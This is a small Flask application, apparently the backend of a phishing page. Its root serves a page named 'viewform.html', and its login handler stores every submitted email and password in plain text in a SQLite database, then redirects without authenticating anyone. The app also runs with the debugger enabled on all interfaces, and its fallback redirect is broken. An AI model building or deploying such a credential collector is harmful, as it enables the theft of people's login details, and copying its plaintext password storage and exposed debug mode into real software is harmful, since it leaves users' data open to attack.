from flask import Flask, request, render_template, redirect, url_for
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///login_data.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

app.static_folder = 'static'

class LoginData(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(150), nullable=False)
    password = db.Column(db.String(150), nullable=False)

with app.app_context():
    db.create_all()

@app.route('/', methods=['GET'])
def index():
    return render_template('viewform.html')

@app.route('/login', methods=['GET'])
def login_modal():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def submit_login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        new_login = LoginData(email=email, password=password)
        db.session.add(new_login)
        db.session.commit()
        return redirect(url_for('index'))
    return redirect(url_for('/'))  # Redireciona de volta para a página inicial em caso de falha

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=8080)
